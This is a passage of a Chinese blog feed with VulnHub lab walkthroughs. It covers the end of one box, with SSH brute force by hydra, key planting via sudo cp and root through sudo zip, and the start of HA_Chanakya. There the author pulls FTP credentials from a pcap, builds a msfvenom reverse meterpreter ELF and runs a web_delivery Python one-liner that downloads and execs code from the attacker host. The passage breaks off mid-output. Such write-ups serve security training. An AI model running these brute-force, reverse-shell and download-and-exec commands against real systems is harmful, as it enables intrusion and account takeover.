src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/648.png" alt="图片"></p><p>Google 翻译过来是：这种宗教不时从印度消失。 就职典礼 恶魔般的圣徒灭亡。 Sambhavami Yuga Yuga建立佛法。<br>好吧，我文盲！不懂说的是什么意思…</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/649.png" alt="图片"></p><p>老规矩，继续枚举一下目录结构看看有没有什么可以利用的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.136.141/ </span><br><span class="line">python3 dirsearch.py -u http://192.168.136.141/ -e .txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/650.png" alt="图片"></p><p>吗的，没有啥可以利用的文件啊，这可咋整？别急！当我一筹莫展的时候，我回过头来看目标是开启了<code>SSH</code>服务，那么我们应该是要通过<code>SSH</code>枚举爆破来搞的，而经过刚刚的信息收集又得知了一些宗教文字和一些关键字。那么我们就可以通过那些关键字来生成一个<code>爆破字典</code>来对目标SSH进行枚举！</p><h2 id="SSH枚举爆破"><a href="#SSH枚举爆破" class="headerlink" title="SSH枚举爆破"></a>SSH枚举爆破</h2><p>因为Web页面上给了我们一些关键字，那么我们可以通过<code>cewl</code>工具来爬行一下Web页面，来输出一些存在Web页面中的单词或者关键字：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.136.141/ -w dic.txt</span><br><span class="line">-w dic.txt 是指把爬取到的单词关键字保存到当前目录下的dic.txt里</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/651.png" alt="图片"></p><p>有了字典以后，那就爆破吧，使用<code>hydra</code>九头蛇暴力又简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dic.txt -P dic.txt -t 20 -F -s 65345 192.168.136.141 ssh</span><br><span class="line">-L ：指定用户名的字典</span><br><span class="line">-P ：指定密码的字典</span><br><span class="line">-t ：指定线程数</span><br><span class="line">-F ：一旦爆破成功就停止枚举，不然有好几百个得等好久</span><br><span class="line">-s ：指定 ssh 的端口号</span><br><span class="line">ssh ： 指定爆破的服务</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/652.png" alt="图片"></p><p>很幸运的爆破枚举成功，得到了用户名：<code>pinak</code>、密码：<code>Gandiv</code>、端口：<code>65345</code>。登陆 SSH：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh pinak@192.168.136.141 -p 65345</span><br><span class="line">USER:pinak</span><br><span class="line">PASS:Gandiv</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/653.png" alt="图片"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>回到 <code>/home</code> 目录发现有三个用户：<code>dhanush</code>、<code>pinak</code>、<code>sarang</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/654.png" alt="图片"></p><p>来到 <code>sarang</code> 用户目录下，发现有一个 <code>.ssh</code> 目录，但是有一个问题，我们进不去 <code>sarang</code> 用户的 <code>.ssh</code> 目录，那咋办？其实我们就可以<code>cp</code>把我们的<code>ssh</code>密匙来放到 <code>sarang</code> 的 <code>.ssh</code> 用户目录下（在下文中我们是有cp的root执行权限的）所以我们就可以通过ssh密匙来登陆它的账户！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/655.png" alt="图片"></p><p>而来到 <code>dhanush</code> 用户目录下，却没有发现可以利用的地方:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/656.png" alt="图片"></p><p>再来看看当前 <code>pinak</code> 用户有那些执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l ：查看当前自己执行sudo的权限</span><br><span class="line">(sarang) NOPASSWD: /bin/cp：我们不需要通过su密码就可以进行cp命令</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/657.png" alt="图片"></p><p>咳咳，该理理思路了，既然我们只有<code>cp</code>的<code>root</code>权限，那么我们就可以通过<code>pinak</code>用户生成一个<code>SSH</code>的<code>私钥</code>（id_rsa）和<code>公钥</code>（id_rsa.pub），我们只需要将<code>ssh</code>的密匙<code>cp</code>到<code>sarang</code>用户的<code>.ssh</code>目录中，那么我们就可以<code>ssh</code>登陆到<code>sarang</code>用户!</p><h3 id="生成SSH私钥和公钥"><a href="#生成SSH私钥和公钥" class="headerlink" title="生成SSH私钥和公钥"></a>生成SSH私钥和公钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">私钥和公钥保存到：/home/pinak/.ssh/ 目录下</span><br><span class="line">密码为：liuwx</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/658.png" alt="图片"></p><p>创建一个名为 <code>authorized_keys</code> 的文件，并将 <code>id_rsa.pub</code> 的内容复制到其中。最后再将 <code>authorized_keys</code> 文件复制到 <code>sarang</code> 用户的 <code>.ssh</code> 文件夹里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 id_rsa.pub</span><br><span class="line">cp id_rsa.pub /home/pinak</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/659.png" alt="图片"></p><p>现在将我们的 <code>id_rsa.pub</code> 公钥<code>cp</code>到<code>sarang</code>的<code>.ssh</code>文件夹下的<code>authorized_keys</code>文件里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/660.png" alt="图片"></p><p>通过<code>ssh</code>公钥连接到<code>sarang</code>用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh sarang@127.0.0.1 -i /.ssh/id_rsa -p 65345</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/661.png" alt="图片"></p><p>这个时候就ssh进入到了 <code>sarang</code> 用户，我们再来看看他可以使用那些 <code>root</code> 权限命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/662.png" alt="图片"></p><h3 id="使用sudo和zip提权"><a href="#使用sudo和zip提权" class="headerlink" title="使用sudo和zip提权"></a>使用sudo和zip提权</h3><p>我们可以发现 <code>sarang</code> 用户可以以 <code>root</code> 用户身份权限来运行 <code>zip</code> 命令，那么我们就可以通过 <code>ZIP</code> 来进行提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">具体可以看这篇文章：https://www.freebuf.com/articles/system/206007.html</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/663.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -u)</span><br><span class="line">sudo zip <span class="variable">$TF</span> /etc/hosts -T -TT <span class="string">&#x27;sh #&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/664.png" alt="图片"></p><p>还有一种可以这样玩：先创建一个 <code>liuwx</code> 文件，然后在将它压缩为<code>zip</code>文件，最后使用<code>unzip-command</code>来执行<code>bash</code>命令从而提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch liuwx</span><br><span class="line">sudo zip /tmp/liuwx.zip /home/sarang/liuwx -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/665.png" alt="图片"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们先是通过<code>Web</code>页面来得到一些关键字单词，通过这些关键词单词生成字典来<code>爆破SSH</code>。然后枚举到了用户<code>pinak</code>进入到<code>pinak</code>用户，这个用户有<code>cp</code>的<code>root</code>执行权限，而<code>sarang</code>用户目录下刚好有<code>.ssh</code>目录，我们通过生成<code>ssh密钥</code>来登陆到<code>sarang</code>用户。最后也是通过<code>ZIP</code>来进行提权拿到<code>Root</code>权限</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-HA_Chanakya，一次渗透测试入侵再到Chkrootkit提权获取Root权限</title>
      <link href="/2019/12/01/HA-Chanakya/"/>
      <url>/2019/12/01/HA-Chanakya/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=2786284&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/612.png" alt="图片"></p><p>这篇文章记录我攻破<code>HA Chanakya</code>的过程，也是我第一次尝试挑战自己的渗透水平；因为在国内搞站太不现实了，根本不敢搞国内的网站，所以只能搭建环境来模拟真实的入侵环境…<br>HackTheNmae：HA Chanakya<br>The Mastermind that took down kingdoms is back and this time he has created a puzzle that would make you scratch you brains! It’s time to face Chanakya.<br>Will you be able to solve this Boot to Root and prove that you are wiser?<br>ENUMERATION IS THE KEY!!!!!<br>下载地址：<a href="https://www.vulnhub.com/entry/ha-chanakya,395/">https://www.vulnhub.com/entry/ha-chanakya,395/</a><br>难度：中等<br>目的：拿到 192.168.136.140 的 Root 权限<br>靶机IP：192.168.136.140<br>攻击机器IP：192.168.136.138</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>因为我<code>VMware</code>使用的是<code>NET</code>模式，所以我的网段是：<code>192.168.136.x</code>，先扫描一下内网存活主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -Sp 192.168.136.0/24</span><br><span class="line">-Sp 是扫描存活，意思就是扫描192.168.136.0，C段存活的主机</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/613.png" alt="图片"></p><p>当然，也可以使用<code>KALI</code>自带的<code>netdiscover</code>也可以扫描出内网存活的所有主机，只是比较慢：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/614.png" alt="图片"></p><p>经过排查，前两个和最后一个IP不可能是靶机的IP，最有可能的是 <code>140</code> 、<code>254</code>；然后继续<code>Nmap</code>探测他们的服务版本信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV 192.168.136.140</span><br><span class="line">nmap -O -sV 192.168.136.254</span><br><span class="line">-O对系统版本进行判断，-sV对端口服务版本进行探测</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/615.png" alt="图片"></p><p>从上图得知，<code>192.168.136.140</code> 才是我们靶机的真实IP，而他开放了<code>21</code>、<code>22</code>、<code>80</code>端口，用到的操作系统是<code>Ubuntu</code>！</p><h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><p>既然开了<code>HTTP</code>服务，那么我们就可以来浏览它的Web网页来看看有没有突破点：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/616.png" alt="图片"></p><p>页面上是没有啥可以利用的，那么我枚举一下目录和文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.136.140/ -X .txt</span><br><span class="line">python3 dirsearch.py -u http://192.168.136.140/ -e .txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/617.png" alt="图片"></p><p>得到了几个目录和一个<code>txt</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.140/assets/</span><br><span class="line">http://192.168.136.140/images/</span><br><span class="line">http://192.168.136.140/abuse.txt</span><br></pre></td></tr></table></figure><p>其中 <code>abuse.txt</code> 打开是这样的：<code>nfubxn.cpncat</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/618.png" alt="图片"></p><p>这玩意估计是一个提示，我边去网上找了一下这关键字：<code>nfubxn.cpncat</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/619.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/620.png" alt="图片"></p><p>发现没有关于 <code>nfubxn.cpncat</code> 的说明，那么换个思路，会不会是加密呢？最后在网上找到了一种为<code>ROT13</code>（凯撒）的加密方式和 <code>nfubxn.cpncat</code> 有点相似，我便解密出来为：<code>ashoka.pcapng</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/621.png" alt="图片"></p><p>结果访问：<code>http://192.168.136.140/ashoka.pcapng</code> 会弹出一个下载，我们把它下载到本地看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/622.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/623.png" alt="图片"></p><p><code>pcapng</code> 后缀说实话我并不知道是什么文件，管他三七二十一拿记事本打开看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/624.png" alt="图片"></p><h2 id="Wireshark分析ashoka-pcapng"><a href="#Wireshark分析ashoka-pcapng" class="headerlink" title="Wireshark分析ashoka.pcapng"></a>Wireshark分析ashoka.pcapng</h2><p>Wireshark?估计意思是叫我用 <code>Wireshark</code> 来打开 ashoka.pcapng 分析数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到了一个ftp的流量数据包，其中有USER和PASS</span><br><span class="line">USER：ashoka</span><br><span class="line">PASS：kautilya</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/625.png" alt="图片"></p><h2 id="登陆FTP"><a href="#登陆FTP" class="headerlink" title="登陆FTP"></a>登陆FTP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~<span class="comment"># ftp 192.168.136.140</span></span><br><span class="line">USER：ashoka</span><br><span class="line">PASS：kautilya</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/626.png" alt="图片"></p><p>从上图可知，我们成功登陆到了他的 <code>FTP</code> 文件传输里，里面有这些文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-rw-------   1 ashoka   ashoka          1 Nov 05 15:57 .bash_history</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        220 Nov 05 14:05 .bash_logout</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka       3771 Nov 05 14:05 .bashrc</span><br><span class="line">drwx------   2 ashoka   ashoka       4096 Nov 05 14:18 .cache</span><br><span class="line">drwxrwxr-x   3 ashoka   ashoka       4096 Nov 05 14:26 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        807 Nov 05 14:05 .profile</span><br></pre></td></tr></table></figure><p>到了这里差不多渗透了 %60 了，我们最终目的是要登陆它的 <code>ROOT</code> 账号。问题来了，既然有 <code>FTP</code> 那么怎么才能拿到 <code>ROOT</code> 权限呢？</p><p>理理思路：刚开始我想使用<code>msfvenon</code>生成一个<code>shell.elf</code>文件来反弹shell的，但是回过头来看这tm是<code>FTP</code>，咋运行我们的shell文件啊，根本反弹不回来；后来在网上找了一下，可以从 SSH 中的 <code>id_rsa.pub</code> 下手！原理是：在KALI生成一个<code>id_rsa.pub</code>的密匙，然后通过 FTP 来上传我们的密匙，因为它服务器上有我们的密匙，从而我们就可以用 <code>SSH</code> 来进行连接！</p><h2 id="在KALI创建ssh-keygen"><a href="#在KALI创建ssh-keygen" class="headerlink" title="在KALI创建ssh-keygen"></a>在KALI创建ssh-keygen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen：生成ssh公钥认证所需的公钥和私钥文件，密码为：liuwx</span><br><span class="line">其中，密匙保存在：root/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/627.png" alt="图片"></p><p>然后我们把 <code>id_rsa.pub</code> 里的内容重定向到 <code>authorized_keys</code> 文件中，再移动到 <code>/root/</code> 目录下，方便 <code>FTP</code> 上传：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub &gt; authorized_keys</span><br><span class="line">mv liuwx_keys /root/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/628.png" alt="图片"></p><p>创建一个 <code>.ssh</code> 目录，为了上传 <code>authorized_keys</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/629.png" alt="图片"></p><p>上传 <code>authorized_keys</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/630.png" alt="图片"></p><h2 id="连接SSH"><a href="#连接SSH" class="headerlink" title="连接SSH"></a>连接SSH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh ashoka@192.168.136.140</span><br><span class="line">账号：ashoka</span><br><span class="line">密码：liuwx（刚刚ssh生成的密匙）</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/631.png" alt="图片"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这个时候我们已经得到了一个<code>shell</code>，但是不是 <code>root</code> 权限，那就提权呗。<br>先<code>msf</code>生成一个木马反弹一个<code>meterpreter</code>回话过来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.136.138 LPORT=6666 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/632.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/633.png" alt="图片"></p><p>上传刚刚生成的文件然后运行我们生成的 <code>shell.elf</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/634.png" alt="图片"></p><p>这个时候得到了一个 <code>Meterpreter</code> 会话：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/635.png" alt="图片"></p><p>使用 <code>post</code> 模块来查看可以利用那些提权 <code>exploit</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/636.png" alt="图片"></p><p>这边 <code>msf</code> 给出了一个 <code>exploit</code> 提权建议，我们看看它的详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info exploit/linux/<span class="built_in">local</span>/netfilter_priv_esc_ipv4</span><br><span class="line"></span><br><span class="line">       Name: Linux Kernel 4.6.3 Netfilter Privilege Escalation</span><br><span class="line">     Module: exploit/linux/<span class="built_in">local</span>/netfilter_priv_esc_ipv4</span><br><span class="line">   Platform: Linux</span><br><span class="line">       Arch: x86</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Good</span><br><span class="line">  Disclosed: 2016-06-03</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  h00die &lt;mike@stcyrsecurity.com&gt;</span><br><span class="line">  vnik</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Ubuntu</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  ----       ---------------  --------  -----------</span><br><span class="line">  COMPILE    Auto             yes       Compile on target (Accepted: Auto, True, False)</span><br><span class="line">  MAXWAIT    180              yes       Max seconds to <span class="built_in">wait</span> <span class="keyword">for</span> decrementation <span class="keyword">in</span> seconds</span><br><span class="line">  REEXPLOIT  <span class="literal">false</span>            yes       desc already ran, no need to re-run, skip to running pwn</span><br><span class="line">  SESSION                     yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module attempts to exploit a netfilter bug on Linux Kernels </span><br><span class="line">  before 4.6.3, and currently only works against Ubuntu 16.04 (not </span><br><span class="line">  16.04.1) with kernel 4.4.0-21-generic. Several conditions have to be </span><br><span class="line">  met <span class="keyword">for</span> successful exploitation: Ubuntu: 1. ip_tables.ko (ubuntu), </span><br><span class="line">  iptable_raw (fedora) has to be loaded (root running iptables -L will </span><br><span class="line">  <span class="keyword">do</span> such) 2. libc6-dev-i386 (ubuntu), glibc-devel.i686 &amp; libgcc.i686 </span><br><span class="line">  (fedora) needs to be installed to compile Kernel 4.4.0-31-generic </span><br><span class="line">  and newer are not vulnerable. We write the ascii files and compile </span><br><span class="line">  on target instead of locally since metasm bombs <span class="keyword">for</span> not having </span><br><span class="line">  cdefs.h (even <span class="keyword">if</span> locally installed)</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://www.exploit-db.com/exploits/40049</span><br><span class="line">  https://cvedetails.com/cve/CVE-2016-4997/</span><br><span class="line">  http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/<span class="built_in">local</span>/netfilter_priv_esc_ipv4):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   COMPILE    Auto             yes       Compile on target (Accepted: Auto, True, False)</span><br><span class="line">   MAXWAIT    180              yes       Max seconds to <span class="built_in">wait</span> <span class="keyword">for</span> decrementation <span class="keyword">in</span> seconds</span><br><span class="line">   REEXPLOIT  <span class="literal">false</span>            yes       desc already ran, no need to re-run, skip to running pwn</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/637.png" alt="图片"></p><p>操，目标机器没安装 gcc 一些软件，由于我们不是 <code>root</code> 权限，也安装不了软件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/638.png" alt="图片"></p><p>额，容我吃一根辣条思考思考其他提权思路，先使用<code>命令注入</code>来反弹一个shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/639.png" alt="图片"></p><p>得到一段注入命令代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.136.138:8080/ikQg5iwVfVK7DNA&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure><p>在目标机运行：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/640.png" alt="图片"></p><p>最后使用这个攻击模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">info  exploit/unix/<span class="built_in">local</span>/chkrootkit </span><br><span class="line"></span><br><span class="line">   Name: Chkrootkit Local Privilege Escalation</span><br><span class="line">   Module: exploit/unix/<span 